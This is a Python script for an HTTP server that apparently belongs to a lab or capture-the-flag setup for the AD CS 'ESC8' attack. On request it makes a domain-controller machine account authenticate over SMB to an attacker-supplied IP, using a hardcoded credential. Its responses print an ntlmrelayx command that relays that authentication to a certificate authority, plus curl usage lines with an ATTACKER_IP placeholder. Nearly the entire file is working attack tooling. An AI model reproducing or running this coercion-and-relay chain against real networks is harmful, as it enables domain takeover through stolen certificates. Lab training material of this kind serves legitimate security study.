import http.server
import urllib.parse
import subprocess
import threading

class TriggerHandler(http.server.BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        pass

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        ip = params.get('ip', [None])[0]

        if ip:
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(f"[*] Triggering NTLM authentication coercion to {ip}...\n".encode())
            self.wfile.write(f"[*] DC$ will attempt SMB connection to {ip}\\share\n".encode())
            self.wfile.write(f"[*] Start ntlmrelayx on your attacker before triggering:\n".encode())
            self.wfile.write(f"    ntlmrelayx.py -t http://10.108.20.20 --adcs --template DomainController\n".encode())

            def run_auth():
                subprocess.run([
                    "smbclient", f"//{ip}/share",
                    "-U", "ESC8-DC$%ESC8DC$Pass2026!",
                    "-c", "ls"
                ], capture_output=True)

            threading.Thread(target=run_auth, daemon=True).start()
            print(f"[+] NTLM coercion triggered -> {ip}", flush=True)
        else:
            self.send_response(400)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"[!] Missing 'ip' parameter.\n")
            self.wfile.write(b"    Usage: curl http://10.108.10.10:9999/trigger?ip=<YOUR_ATTACKER_IP>\n")

if __name__ == '__main__':
    print("[+] ESC8 Coercion Trigger server running on port 9999", flush=True)
    print("[*] Endpoint: http://10.108.10.10:9999/trigger?ip=<ATTACKER_IP>", flush=True)
    http.server.HTTPServer(('0.0.0.0', 9999), TriggerHandler).serve_forever()
